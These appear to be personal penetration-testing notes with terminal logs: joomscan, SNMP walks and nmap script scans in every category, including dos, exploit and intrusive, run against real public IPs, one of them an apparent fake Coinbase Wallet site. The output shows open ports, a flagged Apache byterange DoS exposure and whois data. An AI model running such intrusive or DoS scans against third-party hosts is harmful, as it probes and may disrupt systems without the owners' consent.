        ⭐  ~  ok  took 2m 29s  at 10:48:49 >  

    # joomscan

        joomla scanner

      > sudo joomscan -u 114.34.51.108  -ec --timeout 1000
            ____  _____  _____  __  __  ___   ___    __    _  _
       (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
      .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
      \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                            (1337.today)

        --=[OWASP JoomScan
        +---++---==[Version : 0.0.7
        +---++---==[Update Date : [2018/09/23]
        +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
        --=[Code name : Self Challenge
        @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

    Processing http://114.34.51.108 ...

    [+] FireWall Detector
    [++] Firewall not detected

    [+] Detecting Joomla Version
    [++] ver 404


    [+] Core Joomla Vulnerability                                                                                                                                                                             
    [++] Target Joomla core is not vulnerable                                    

    # LFI\RFI Test

        https://www.extrasoft.es/lfi-rfi-vulnerabilidades-en-paginas-web-3/


    # S.O. LINUX/WINDOWS

    sudo snmpwalk -c public -v1 91.195.80.226 1

    > sudo snmpwalk -v1 -c public 91.195.80.226
    iso.3.6.1.2.1.1.1.0 = STRING: "APC Web/SNMP Management Card (MB:v4.1.1 PF:v3.9.2 PN:apc_hw02_aos_392.bin AF1:v3.9.2 AN1:apc_hw02_rpdu_392.bin MN:AP7920 HR:B2 SN: ZA0609020383 MD:02/24/2006) "

    smbclient -L //ipaddress
    showmount -e ipaddress port

    # rpcinfo. rpcinfo makes an RPC call to an RPC server and reports what it finds.

        https://www.computerhope.com/unix/urpcinfo.htm#examples

    # Enum4Linux

        https://www.kali.org/tools/enum4linux/

        Enum4linux is a tool for enumerating information from Windows and Samba systems.
        It attempts to offer similar functionality to enum.exe formerly available from www.bindview.com.

    # OTROS

    # Using nmap script engine (nse)

    https://nmap.org/book/man-nse.html

    https://geekflare.com/nmap-vulnerability-scan/

    13 categories: auth, broadcast, default. discovery, dos, exploit, external, fuzzer, intrusive, malware, safe, version, and vuln

    > nmap -script dos  --webxml -oA nmap-156.242.11.17 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:27 CEST
    Stats: 0:00:16 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
    Parallel DNS resolution of 1 host. Timing: About 0.00% done
    Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 0.79% done

    > nmap -script discovery  --webxml -oA nmap-156.242.11.17-discovery 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:33 CEST
    Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 94.29% done; ETC: 18:33 (0:00:00 remaining)
    Pre-scan script results:
    | targets-asn:
    |_  targets-asn.asn is a mandatory parameter
    |_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
    |_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/

    > nmap -script default  --webxml -oA nmap-156.242.11.17-default 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:39 CEST
    Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 40.10% done; ETC: 18:39 (0:00:13 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    443/tcp open   https
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    | tls-nextprotoneg:
    |_  http/1.1
    | tls-alpn:
    |_  http/1.1
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    |_ssl-date: TLS randomness does not represent time

    Nmap done: 1 IP address (1 host up) scanned in 22.30 seconds

     ⭐  ~  ok  took 22s  at 18:39:24 >

     > nmap -script malware  --webxml -oA nmap-156.242.11.17-malware 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:54 CEST
    Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 78.90% done; ETC: 18:54 (0:00:03 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    443/tcp open   https

    Nmap done: 1 IP address (1 host up) scanned in 20.09 seconds

     ⭐  ~  ok  took 20s  at 18:54:41 >
    > nmap -script safe  --webxml -oA nmap-156.242.11.17-safe 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:55 CEST
    Stats: 0:00:15 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 96.83% done; ETC: 18:55 (0:00:01 remaining)
    Stats: 0:00:32 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 98.41% done; ETC: 18:56 (0:00:01 remaining)
    Pre-scan script results:
    |_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
    |_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
    | targets-asn:
    |_  targets-asn.asn is a mandatory parameter
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    |_http-referer-checker: Couldn't find any cross-domain scripts.
    |_http-date: Fri, 19 Aug 2022 16:56:49 GMT; -3s from local time.
    |_http-mobileversion-checker: No mobile version detected.
    | http-vuln-cve2011-3192:
    |   VULNERABLE:
    |   Apache byterange filter DoS
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2011-3192  BID:49303
    |       The Apache web server is vulnerable to a denial of service attack when numerous
    |       overlapping byte ranges are requested.
    |     Disclosure date: 2011-08-19
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    |       https://seclists.org/fulldisclosure/2011/Aug/175
    |       https://www.securityfocus.com/bid/49303
    |_      https://www.tenable.com/plugins/nessus/55976
    |_http-xssed: No previously reported XSS vuln.
    |_http-fetch: Please enter the complete path of the directory to save data in.
    | http-security-headers:
    |   Cache_Control:
    |_    Header: Cache-Control: no-cache
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | http-headers:
    |   Server: nginx
    |   Date: Fri, 19 Aug 2022 16:56:46 GMT
    |   Content-Type: text/html; charset=utf-8
    |   Content-Length: 712
    |   Last-Modified: Mon, 25 Apr 2022 03:00:07 GMT
    |   Connection: close
    |   ETag: "62660eb7-2c8"
    |   Cache-Control: no-cache
    |   Accept-Ranges: bytes
    |   
    |_  (Request type: HEAD)
    | http-useragent-tester:
    |   Status for browser useragent: 200
    |   Allowed User Agents:
    |     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
    |     libwww
    |     lwp-trivial
    |     libcurl-agent/1.0
    |     PHP/
    |     Python-urllib/2.5
    |     GT::WWW
    |     Snoopy
    |     MFC_Tear_Sample
    |     HTTP::Lite
    |     PHPCrawl
    |     URI::Fetch
    |     Zend_Http_Client
    |     http client
    |     PECL::HTTP
    |     Wget/1.13.4 (linux-gnu)
    |_    WWW-Mechanize/1.34
    | http-comments-displayer:
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=156.242.11.17
    |     
    |     Path: http://156.242.11.17:80/
    |     Line number: 4
    |     Comment:
    |         <!-- <meta property="og:site_name" content="CB-W">
    |             <meta property="og:title" content="Coinbase Wallet">
    |             <meta property="og:image" content="machine/og_img.png">
    |             <meta property="og:url" content="machine/share.html">
    |             <meta property="og:type" content="website" />
    |             <meta property="og:updated_time" content="1637723687" /> -->
    |     
    |     Path: http://156.242.11.17:80/
    |     Line number: 3
    |     Comment:
    |         <!-- og meta -->
    |     
    |     Path: http://156.242.11.17:80/
    |     Line number: 10
    |     Comment:
    |         <!-- twitter -->
    |     
    |     Path: http://156.242.11.17:80/
    |     Line number: 11
    |     Comment:
    |         <!-- <meta name="twitter:site" content="CB-W" />
    |             <meta name="twitter:title" content="Coinbase Wallet ">
    |             <meta name="twitter:image" content="machine/og_img.png">
    |_            <meta name="twitter:card" content="summary_large_image" /> -->
    443/tcp open   https
    | http-useragent-tester:
    |   Status for browser useragent: 200
    |   Allowed User Agents:
    |     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
    |     libwww
    |     lwp-trivial
    |     libcurl-agent/1.0
    |     PHP/
    |     Python-urllib/2.5
    |     GT::WWW
    |     Snoopy
    |     MFC_Tear_Sample
    |     HTTP::Lite
    |     PHPCrawl
    |     URI::Fetch
    |     Zend_Http_Client
    |     http client
    |     PECL::HTTP
    |     Wget/1.13.4 (linux-gnu)
    |_    WWW-Mechanize/1.34
    | http-security-headers:
    |   Strict_Transport_Security:
    |     HSTS not configured in HTTPS Server
    |   Cache_Control:
    |_    Header: Cache-Control: no-cache
    |_http-mobileversion-checker: No mobile version detected.
    | http-headers:
    |   Server: nginx
    |   Date: Fri, 19 Aug 2022 16:56:49 GMT
    |   Content-Type: text/html; charset=utf-8
    |   Content-Length: 712
    |   Last-Modified: Mon, 25 Apr 2022 03:00:07 GMT
    |   Connection: close
    |   ETag: "62660eb7-2c8"
    |   Cache-Control: no-cache
    |   Accept-Ranges: bytes
    |   
    |_  (Request type: HEAD)
    |_ssl-date: TLS randomness does not represent time
    |_http-referer-checker: Couldn't find any cross-domain scripts.
    | tls-nextprotoneg:
    |_  http/1.1
    |_http-date: Fri, 19 Aug 2022 16:56:44 GMT; 0s from local time.
    |_http-xssed: No previously reported XSS vuln.
    | http-comments-displayer:
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=156.242.11.17
    |     
    |     Path: https://156.242.11.17:443/
    |     Line number: 4
    |     Comment:
    |         <!-- <meta property="og:site_name" content="CB-W">
    |             <meta property="og:title" content="Coinbase Wallet">
    |             <meta property="og:image" content="machine/og_img.png">
    |             <meta property="og:url" content="machine/share.html">
    |             <meta property="og:type" content="website" />
    |             <meta property="og:updated_time" content="1637723687" /> -->
    |     
    |     Path: https://156.242.11.17:443/
    |     Line number: 3
    |     Comment:
    |         <!-- og meta -->
    |     
    |     Path: https://156.242.11.17:443/
    |     Line number: 10
    |     Comment:
    |         <!-- twitter -->
    |     
    |     Path: https://156.242.11.17:443/
    |     Line number: 11
    |     Comment:
    |         <!-- <meta name="twitter:site" content="CB-W" />
    |             <meta name="twitter:title" content="Coinbase Wallet ">
    |             <meta name="twitter:image" content="machine/og_img.png">
    |_            <meta name="twitter:card" content="summary_large_image" /> -->
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    |_http-fetch: Please enter the complete path of the directory to save data in.
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | tls-alpn:
    |_  http/1.1

    Host script results:
    |_tor-consensus-checker: 156.242.11.17 not found in Tor consensus
    | port-states:
    |   tcp:
    |     open: 80,443
    |     filtered: 1,3-4,6-7,9,13,17,19-21,23-26,30,32-33,37,42-43,49,53,70,79,81-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,444-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389
    |_    closed: 22
    | dns-blacklist:
    |   SPAM
    |     bl.spamcop.net - FAIL
    |     dnsbl.inps.de - FAIL
    |     l2.apews.org - FAIL
    |     sbl.spamhaus.org - FAIL
    |     spam.dnsbl.sorbs.net - FAIL
    |     bl.nszones.com - FAIL
    |     list.quorum.to - FAIL
    |     all.spamrats.com - FAIL
    |   ATTACK
    |     all.bl.blocklist.de - FAIL
    |   PROXY
    |_    socks.dnsbl.sorbs.net - FAIL
    | unusual-port:
    |_  WARNING: this script depends on Nmap's service/version detection (-sV)
    |_clock-skew: mean: -1s, deviation: 2s, median: -3s
    | whois-ip: Record found at whois.afrinic.net
    | inetnum: 156.242.11.0 - 156.242.11.255
    | netname: HongKong_MEGALAYER_Technology
    | descr: HongKong MEGALAYER Technology
    |_country: US
    |_fcrdns: FAIL (No PTR record)
    |_asn-query: No Answers
    |_whois-domain: You should provide a domain name.
    | ip-geolocation-geoplugin: coordinates: 34.0544, -118.244
    |_location: California, United States

    Post-scan script results:
    Bug in ip-geolocation-map-bing: no string output.
    | reverse-index:
    |   80/tcp: 156.242.11.17
    |_  443/tcp: 156.242.11.17
    Bug in ip-geolocation-map-google: no string output.
    Bug in ip-geolocation-map-kml: no string output.
    Nmap done: 1 IP address (1 host up) scanned in 140.46 seconds

    ⭐  ~  ok  took 2m 21s  at 18:57:51 >    


    > nmap -script auth  --webxml -oA nmap-156.242.11.17-auth 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:40 CEST
    Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 0.65% done
    Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 58.50% done; ETC: 18:40 (0:00:06 remaining)
    Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 78.79% done; ETC: 18:40 (0:00:00 remaining)
    Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 98.48% done; ETC: 18:40 (0:00:00 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    |_http-config-backup: ERROR: Script execution failed (use -d to debug)
    443/tcp open   https
    |_http-config-backup: ERROR: Script execution failed (use -d to debug)

    Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds

     ⭐  ~  ok  took 20s  at 18:40:36 >  

    > nmap -script broadcast  --webxml -oA nmap-156.242.11.17-broadcast 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:41 CEST
    Stats: 0:00:29 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 98.08% done; ETC: 18:42 (0:00:01 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    443/tcp open   https

    Nmap done: 1 IP address (1 host up) scanned in 52.34 seconds

    ⭐  ~  ok  took 52s  at 18:42:39 >     

    > nmap -script vuln  --webxml -oA nmap-156.242.11.17-vuln 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 19:09 CEST
    Stats: 0:09:04 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.53% done; ETC: 19:18 (0:00:02 remaining)
    Stats: 0:10:35 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.53% done; ETC: 19:20 (0:00:03 remaining)
    Stats: 0:11:32 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.53% done; ETC: 19:21 (0:00:03 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    | http-vuln-cve2011-3192:
    |   VULNERABLE:
    |   Apache byterange filter DoS
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2011-3192  BID:49303
    |       The Apache web server is vulnerable to a denial of service attack when numerous
    |       overlapping byte ranges are requested.
    |     Disclosure date: 2011-08-19
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    |       https://www.tenable.com/plugins/nessus/55976
    |       https://seclists.org/fulldisclosure/2011/Aug/175
    |_      https://www.securityfocus.com/bid/49303
    | http-enum:
    |   /0/: Potentially interesting folder
    |_  /index/: Potentially interesting folder
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    443/tcp open   https
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-enum:
    |   /0/: Potentially interesting folder
    |_  /index/: Potentially interesting folder
    | http-vuln-cve2011-3192:
    |   VULNERABLE:
    |   Apache byterange filter DoS
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2011-3192  BID:49303
    |       The Apache web server is vulnerable to a denial of service attack when numerous
    |       overlapping byte ranges are requested.
    |     Disclosure date: 2011-08-19
    |     References:
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
    |       https://www.tenable.com/plugins/nessus/55976
    |       https://seclists.org/fulldisclosure/2011/Aug/175
    |_      https://www.securityfocus.com/bid/49303
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

    Nmap done: 1 IP address (1 host up) scanned in 931.36 seconds

    ⭐  ~  ok  took 15m 31s  at 19:25:06 >               

    > nmap -script exploit  --webxml -oA nmap-156.242.11.17-exploit 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:44 CEST
    Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 95.74% done; ETC: 18:44 (0:00:00 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.19s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    443/tcp open   https
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-csrf: Couldn't find any CSRF vulnerabilities.
    |_http-dombased-xss: Couldn't find any DOM based XSS.

    Nmap done: 1 IP address (1 host up) scanned in 22.40 seconds

    ⭐  ~  ok  took 22s  at 18:44:23 >

    > nmap -script external  --webxml -oA nmap-156.242.11.17-external 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:45 CEST
    Pre-scan script results:
    |_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
    | targets-asn:
    |_  targets-asn.asn is a mandatory parameter
    |_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
    Stats: 0:00:57 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 65.79% done; ETC: 18:46 (0:00:23 remaining)
    Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 92.31% done; ETC: 18:46 (0:00:06 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    |_http-xssed: No previously reported XSS vuln.
    443/tcp open   https
    |_http-xssed: No previously reported XSS vuln.

    Host script results:
    | dns-blacklist:
    |   SPAM
    |     dnsbl.inps.de - FAIL
    |     l2.apews.org - FAIL
    |_    list.quorum.to - FAIL
    |_asn-query: No Answers
    |_tor-consensus-checker: 156.242.11.17 not found in Tor consensus
    Bug in ip-geolocation-geoplugin: no string output.
    |_whois-domain: You should provide a domain name.
    | whois-ip: Record found at whois.afrinic.net
    | inetnum: 156.242.11.0 - 156.242.11.255
    | netname: HongKong_MEGALAYER_Technology
    | descr: HongKong MEGALAYER Technology
    |_country: US

    Nmap done: 1 IP address (1 host up) scanned in 91.68 seconds

    ⭐  ~  ok  took 1m 32s  at 18:46:56 >   

    > nmap -script intrusive  --webxml -oA nmap-156.242.11.17-intrusive 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:49 CEST
    Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 18.81% done; ETC: 18:49 (0:00:22 remaining)
    Stats: 0:01:08 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 19.24% done; ETC: 18:53 (0:03:13 remaining)
    Stats: 0:02:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 19.24% done; ETC: 18:58 (0:07:29 remaining)
    Stats: 0:03:58 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 19.24% done; ETC: 19:08 (0:15:07 remaining)
    ...

    > nmap -script fuzzer  --webxml -oA nmap-156.242.11.17-fuzzer 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:48 CEST
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE
    22/tcp  closed ssh
    80/tcp  open   http
    443/tcp open   https

    Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds

    ⭐  ~  ok  took 13s  at 18:48:17 >  


    > nmap -sV  -A --webxml -oA nmap-156.242.11.17 156.242.11.17
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 18:20 CEST
    Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 52.80% done; ETC: 18:20 (0:00:08 remaining)
    Nmap scan report for 156.242.11.17
    Host is up (0.18s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE  SERVICE  VERSION
    22/tcp  closed ssh
    80/tcp  open   http     nginx
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    443/tcp open   ssl/http nginx
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | ssl-cert: Subject: commonName=www.aavadefimax.xyz
    | Subject Alternative Name: DNS:www.aavadefimax.xyz
    | Not valid before: 2022-07-24T07:32:08
    |_Not valid after:  2022-10-22T07:32:07
    | tls-nextprotoneg:
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    | tls-alpn:
    |_  http/1.1

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 35.47 seconds
    > ls nmap-156.242.11.17.*
    nmap-156.242.11.17.gnmap  nmap-156.242.11.17.nmap  nmap-156.242.11.17.xml

    # you can run two or more categories...

    (base) [sáb 22/08/20 13:09 CEST][s000][x86_64/darwin21.0/21.6.0][5.8.1]
    <aironman@MacBook-Pro-de-Alonso:~>
    zsh 6590 [255] % nmap -script default,vuln -oA nmap-1.1.1.1 1.1.1.1
    Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-20 13:10 CEST
    Stats: 0:00:26 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
    NSE Timing: About 92.31% done; ETC: 13:10 (0:00:02 remaining)
    Pre-scan script results:
    | broadcast-avahi-dos:
    |   Discovered hosts:
    |     224.0.0.251
    |   After NULL UDP avahi packet DoS (CVE-2011-1002).
    |_  Hosts are all up (not vulnerable).
    Stats: 0:02:04 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.21% done; ETC: 13:12 (0:00:00 remaining)
    Stats: 0:02:54 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.36% done; ETC: 13:13 (0:00:01 remaining)
    Stats: 0:03:17 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.68% done; ETC: 13:13 (0:00:00 remaining)
    Stats: 0:10:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:20 (0:00:01 remaining)
    Stats: 0:15:26 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:25 (0:00:01 remaining)
    Stats: 0:16:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:26 (0:00:01 remaining)
    Stats: 0:16:41 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:26 (0:00:01 remaining)
    Stats: 0:16:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:26 (0:00:01 remaining)
    Stats: 0:19:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:29 (0:00:02 remaining)
    Stats: 0:19:03 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 99.84% done; ETC: 13:29 (0:00:02 remaining)
    Nmap scan report for one.one.one.one (1.1.1.1)
    Host is up (0.020s latency).
    Not shown: 997 filtered tcp ports (no-response)
    PORT    STATE SERVICE
    53/tcp  open  domain
    | dns-nsid:
    |   NSID: 40m68 (34306d3638)
    |_  id.server: MAD
    80/tcp  open  http
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    |_http-title: Did not follow redirect to https://one.one.one.one/
